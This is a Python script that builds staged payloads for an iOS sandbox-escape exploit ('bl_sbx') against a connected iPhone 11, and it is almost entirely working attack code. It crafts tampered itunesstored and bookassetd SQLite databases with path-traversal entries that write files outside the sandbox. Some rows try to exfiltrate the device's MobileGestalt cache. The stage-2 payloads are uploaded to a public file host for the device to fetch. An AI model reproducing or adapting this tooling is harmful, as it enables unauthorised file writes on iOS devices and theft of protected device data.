"""Build Phase-B payloads for the bl_sbx exploit on the connected iPhone 11.

Phase B answers, in one device reboot:
  dl150  does the download engine accept file:// URLs (device-local source)?
  dl151  can itunesstored write into /var/mobile/Media (AFC visible)?
  dl152  which container path is the bookassetd app-group on this device?
         (one asset row per candidate; the crafted BLDatabaseManager.sqlite is
         the payload, so a hit is proved by the stage-2 write in the next boot)
  dl153  is the network usable (HTTP canary through catbox)?

The crafted bookassetd database carries three rows:
  row 1  traversal write of an EPUB payload into /var/mobile/Media (proof)
  row 2  ZASSETPATH points at the device's own MobileGestalt cache while
         ZURL is a file:// URL (raw-download exfiltration attempt)
  row 3  ZPLISTPATH points at the device's own MobileGestalt cache
         (copy-from-plist exfiltration attempt)

Usage:  python build_phase_b.py
"""

from __future__ import annotations

import hashlib
import io
import json
import plistlib
import shutil
import sqlite3
import urllib.request
import uuid
import zipfile
from pathlib import Path

BASE = Path(__file__).resolve().parent
UPSTREAM_DOWNLOADS = BASE / "downloads.28.sqlitedb"
UPSTREAM_BL = BASE / "BLDatabaseManager.sqlite"

DEVICE_GESTALT = (
    "/private/var/containers/Shared/SystemGroup/"
    "systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist"
)
MEDIA = "/private/var/mobile/Media"
TRAVERSAL = "../../../../../../private/var/mobile/Media"

BOOKS_GROUP_CANDIDATES = [
    "systemgroup.com.apple.books",
    "systemgroup.com.apple.ibooks",
    "systemgroup.com.apple.bookassetd",
    "systemgroup.com.apple.icloud.books",
    "group.com.apple.iBooks",
    "3DBBBC39-F5BA-4333-B40C-6996DE48F91C",
    "0DAF9578-C293-4C5D-9CF4-21E78AE8E372",
]


def sha1_bytes(data: bytes) -> str:
    return hashlib.sha1(data).hexdigest()


def flatten(path: Path) -> None:
    """Move a SQLite database out of WAL mode into a single self-contained file."""
    con = sqlite3.connect(path)
    try:
        con.execute("PRAGMA wal_checkpoint(TRUNCATE)")
        con.execute("PRAGMA journal_mode=DELETE")
        con.commit()
    finally:
        con.close()
    for suffix in ("-wal", "-shm"):
        side = path.with_name(path.name + suffix)
        if side.exists():
            side.unlink()


def hash_array(sha1: str | None) -> bytes | None:
    if not sha1:
        return None
    return plistlib.dumps({"6": sha1}, fmt=plistlib.FMT_BINARY)


def build_epub(path: Path, entries: list[tuple[str, bytes]]) -> None:
    """Write an EPUB-shaped zip: stored 'mimetype' first, then payload entries."""
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        info = zipfile.ZipInfo("mimetype")
        info.compress_type = zipfile.ZIP_STORED
        archive.writestr(info, b"application/epub+zip")
        for name, data in entries:
            info = zipfile.ZipInfo(name)
            info.compress_type = zipfile.ZIP_DEFLATED
            archive.writestr(info, data)
    path.write_bytes(buffer.getvalue())


def catbox_upload(path: Path) -> str:
    """Upload a file to catbox and return its public URL."""
    boundary = uuid.uuid4().hex
    body = bytearray()
    body += f"--{boundary}\r\n".encode()
    body += b'Content-Disposition: form-data; name="reqtype"\r\n\r\nfileupload\r\n'
    body += f"--{boundary}\r\n".encode()
    body += (
        'Content-Disposition: form-data; name="fileToUpload"; filename="'
        + path.name
        + '"\r\n'
    ).encode()
    body += b"Content-Type: application/octet-stream\r\n\r\n"
    body += path.read_bytes()
    body += f"\r\n--{boundary}--\r\n".encode()
    request = urllib.request.Request(
        "https://catbox.moe/user/api.php",
        data=bytes(body),
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    with urllib.request.urlopen(request, timeout=120) as response:
        return response.read().decode().strip()


def build_bl(out: Path) -> None:
    """Craft the bookassetd database: one proof row plus two exfiltration rows."""
    shutil.copyfile(UPSTREAM_BL, out)
    flatten(out)
    con = sqlite3.connect(out)
    cur = con.cursor()
    columns = [row[1] for row in cur.execute("PRAGMA table_info(ZBLDOWNLOADINFO)")]
    template = dict(zip(columns, cur.execute("SELECT * FROM ZBLDOWNLOADINFO WHERE Z_PK=1").fetchone()))

    rows = [
        {
            "Z_PK": 1,
            "ZDOWNLOADID": TRAVERSAL,
            "ZASSETPATH": f"{MEDIA}/Books/SBX-PROOF-ASSET.epub",
            "ZPLISTPATH": f"{MEDIA}/Books/SBX-PROOF-META.plist",
            "ZURL": "{PROOF_EPUB_URL}",
            "ZFILEEXTENSION": "epub",
        },
        {
            "Z_PK": 2,
            "ZDOWNLOADID": TRAVERSAL,
            "ZASSETPATH": f"{MEDIA}/SBX-EXFIL-ASSET.raw",
            "ZPLISTPATH": f"{MEDIA}/SBX-EXFIL-META.plist",
            "ZURL": f"file://{DEVICE_GESTALT}",
            "ZFILEEXTENSION": "epub",
        },
        {
            "Z_PK": 3,
            "ZDOWNLOADID": TRAVERSAL,
            "ZASSETPATH": f"{MEDIA}/Books/SBX-EXFIL2-ASSET.epub",
            "ZPLISTPATH": DEVICE_GESTALT,
            "ZURL": "{PROOF_EPUB_URL}",
            "ZFILEEXTENSION": "epub",
        },
    ]

    for spec in rows:
        values = dict(template)
        values.update(spec)
        if spec["Z_PK"] == 1:
            assignments = ", ".join(f"{column}=?" for column in columns if column != "Z_PK")
            cur.execute(
                f"UPDATE ZBLDOWNLOADINFO SET {assignments} WHERE Z_PK=1",
                [values.get(column) for column in columns if column != "Z_PK"],
            )
            continue
        placeholders = ", ".join("?" for _ in columns)
        cur.execute(
            f"INSERT INTO ZBLDOWNLOADINFO ({', '.join(columns)}) VALUES ({placeholders})",
            [values.get(column) for column in columns],
        )
    cur.execute("UPDATE Z_PRIMARYKEY SET Z_MAX=? WHERE Z_NAME='BLDownloadInfo'", (len(rows),))
    con.commit()
    con.close()


def build_downloads(out: Path, assets: list[dict]) -> None:
    """Craft the itunesstored database: one asset row and one download row per probe."""
    shutil.copyfile(UPSTREAM_DOWNLOADS, out)
    flatten(out)
    con = sqlite3.connect(out)
    cur = con.cursor()
    asset_columns = [row[1] for row in cur.execute("PRAGMA table_info(asset)")]
    download_columns = [row[1] for row in cur.execute("PRAGMA table_info(download)")]
    asset_template = dict(zip(asset_columns, cur.execute("SELECT * FROM asset WHERE pid=1234567890").fetchone()))
    download_template = dict(zip(download_columns, cur.execute("SELECT * FROM download WHERE pid=6936249076851270150").fetchone()))
    cur.execute("DELETE FROM asset")
    cur.execute("DELETE FROM download")

    for index, asset in enumerate(assets):
        pid = 1234567890 + index
        download_id = 6936249076851270150 + index
        values = dict(asset_template)
        values.update(
            {
                "pid": pid,
                "download_id": download_id,
                "url": asset["url"],
                "local_path": asset["local_path"],
                "hash_array": hash_array(asset.get("sha1")),
                "path_extension": asset.get("path_extension", "epub"),
                "is_downloaded": 0,
                "url_session_task_id": -1,
                "download_token": 0,
            }
        )
        placeholders = ", ".join("?" for _ in asset_columns)
        cur.execute(
            f"INSERT INTO asset ({', '.join(asset_columns)}) VALUES ({placeholders})",
            [values.get(column) for column in asset_columns],
        )
        download_values = dict(download_template)
        download_values.update({"pid": download_id, "timestamp": 1754673547})
        placeholders = ", ".join("?" for _ in download_columns)
        cur.execute(
            f"INSERT INTO download ({', '.join(download_columns)}) VALUES ({placeholders})",
            [download_values.get(column) for column in download_columns],
        )
    con.commit()
    con.close()


def main() -> int:
    # 1. stage-2 payloads
    proof_epub = BASE / "SBX-PROOF.epub"
    build_epub(proof_epub, [("SBX-PROOF-B.txt", b"SBX-STAGE2-PROOF-OK\n")])
    bl_out = BASE / "crafted-BLDatabaseManager.sqlite"
    build_bl(bl_out)

    canary = BASE / "SBX-HTTP.txt"
    canary.write_bytes(b"SBX-HTTP-OK\n")
    meta = BASE / "SBX-ITUNESMETA.plist"
    meta.write_bytes((BASE / "iTunesMetadata.plist").read_bytes())

    # 2. publish over http so the device can fetch them if file:// is rejected
    proof_url = catbox_upload(proof_epub)
    bl_url = catbox_upload(bl_out)
    canary_url = catbox_upload(canary)
    meta_url = catbox_upload(meta)

    # 3. fill the stage-2 URL into the crafted bookassetd database, re-publish
    con = sqlite3.connect(bl_out)
    con.execute(
        "UPDATE ZBLDOWNLOADINFO SET ZURL=? WHERE Z_PK IN (1,3)", (proof_url,)
    )
    con.commit()
    con.close()
    bl_url = catbox_upload(bl_out)
    bl_sha1 = sha1_bytes(bl_out.read_bytes())

    # 4. stage-1 assets
    assets: list[dict] = [
        {
            "url": canary_url,
            "local_path": f"{MEDIA}/SBX-HTTP-A.txt",
            "sha1": sha1_bytes(canary.read_bytes()),
        },
        {
            "url": "file:///var/mobile/Media/SBX-HTTP.txt",
            "local_path": f"{MEDIA}/SBX-FILE-A.txt",
            "sha1": sha1_bytes(canary.read_bytes()),
        },
        {
            "url": meta_url,
            "local_path": f"{MEDIA}/iTunes_Control/iTunes/iTunesMetadata.plist",
            "sha1": sha1_bytes(meta.read_bytes()),
        },
    ]
    for candidate in BOOKS_GROUP_CANDIDATES:
        target = (
            "/private/var/containers/Shared/SystemGroup/"
            f"{candidate}/Documents/BLDatabaseManager/BLDatabaseManager.sqlite"
        )
        assets.append(
            {
                "url": bl_url,
                "local_path": target,
                "sha1": bl_sha1,
            }
        )
    # same candidates again, this time from a device-local source
    for candidate in BOOKS_GROUP_CANDIDATES[:3]:
        target = (
            "/private/var/containers/Shared/SystemGroup/"
            f"{candidate}/Documents/BLDatabaseManager/BLDatabaseManager.sqlite"
        )
        assets.append(
            {
                "url": "file:///var/mobile/Media/SBX-BL.sqlite",
                "local_path": target,
                "sha1": bl_sha1,
            }
        )

    downloads_out = BASE / "crafted-downloads.28.sqlitedb"
    build_downloads(downloads_out, assets)

    manifest = {
        "proof_epub_url": proof_url,
        "bl_url": bl_url,
        "canary_url": canary_url,
        "meta_url": meta_url,
        "bl_sha1": bl_sha1,
        "files_to_push": {
            "SBX-PROOF.epub": str(proof_epub),
            "crafted-BLDatabaseManager.sqlite": str(bl_out),
            "SBX-HTTP.txt": str(canary),
            "SBX-ITUNESMETA.plist": str(meta),
        },
        "assets": assets,
    }
    (BASE / "manifest-phaseB.json").write_text(
        json.dumps(manifest, indent=2, ensure_ascii=False), encoding="utf-8"
    )
    print(json.dumps(manifest, indent=2, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
